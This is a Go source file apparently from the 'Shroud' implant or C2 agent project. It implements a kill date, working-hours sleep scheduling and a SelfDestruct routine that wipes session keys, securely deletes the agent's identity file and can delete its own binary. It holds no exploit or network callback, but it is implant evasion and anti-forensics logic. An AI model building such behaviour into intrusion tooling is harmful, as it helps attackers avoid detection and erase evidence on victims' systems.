package process

import (
	"fmt"
	"os"
	"strconv"
	"strings"
	"time"

	"Shroud/crypto"
	"Shroud/global"
	"Shroud/identity"
	"Shroud/utils"
)

func ParseKillDate(s string) (time.Time, error) {
	if s == "" {
		return time.Time{}, nil
	}
	return time.Parse("2006-01-02", s)
}

func ParseWorkHours(s string) (startH, startM, endH, endM int, err error) {
	if s == "" {
		return 0, 0, 0, 0, nil
	}
	parts := strings.SplitN(s, "-", 2)
	if len(parts) != 2 {
		return 0, 0, 0, 0, fmt.Errorf("invalid work-hours format, expected HH:MM-HH:MM")
	}
	startH, startM, err = parseHHMM(parts[0])
	if err != nil {
		return
	}
	endH, endM, err = parseHHMM(parts[1])
	return
}

func parseHHMM(s string) (int, int, error) {
	parts := strings.SplitN(s, ":", 2)
	if len(parts) != 2 {
		return 0, 0, fmt.Errorf("invalid time format: %s", s)
	}
	h, err := strconv.Atoi(parts[0])
	if err != nil || h < 0 || h > 23 {
		return 0, 0, fmt.Errorf("invalid hour: %s", parts[0])
	}
	m, err := strconv.Atoi(parts[1])
	if err != nil || m < 0 || m > 59 {
		return 0, 0, fmt.Errorf("invalid minute: %s", parts[1])
	}
	return h, m, nil
}

func IsWorkingHours(startH, startM, endH, endM int) bool {
	now := time.Now()
	start := time.Date(now.Year(), now.Month(), now.Day(), startH, startM, 0, 0, now.Location())
	end := time.Date(now.Year(), now.Month(), now.Day(), endH, endM, 0, 0, now.Location())
	return now.After(start) && now.Before(end)
}

func SelfDestruct(selfDelete bool) {
	if global.Session != nil {
		if global.Session.AgentIdentity != nil {
			global.Session.AgentIdentity.WipeSeeds()
		}
		crypto.Wipe(global.Session.LinkKey)
	}
	if global.G_Component != nil {
		crypto.Wipe(global.G_Component.CryptoKey)
	}
	_ = utils.SecureRemoveFile(identity.DefaultAgentPath())
	if selfDelete {
		utils.SelfDeleteBinary()
	}
	os.Exit(0)
}

func StartLifecycleMonitor(killDate time.Time, workHours string, selfDelete bool) {
	hasKillDate := !killDate.IsZero()
	startH, startM, endH, endM, err := ParseWorkHours(workHours)
	hasWorkHours := err == nil && workHours != ""

	ticker := time.NewTicker(60 * time.Second)
	defer ticker.Stop()

	for range ticker.C {
		if hasKillDate && time.Now().After(killDate) {
			SelfDestruct(selfDelete)
		}
		if hasWorkHours && !IsWorkingHours(startH, startM, endH, endM) {
			nextStart := nextWorkStart(startH, startM)
			time.Sleep(time.Until(nextStart))
		}
	}
}

func nextWorkStart(startH, startM int) time.Time {
	now := time.Now()
	next := time.Date(now.Year(), now.Month(), now.Day(), startH, startM, 0, 0, now.Location())
	if !next.After(now) {
		next = next.Add(24 * time.Hour)
	}
	return next
}
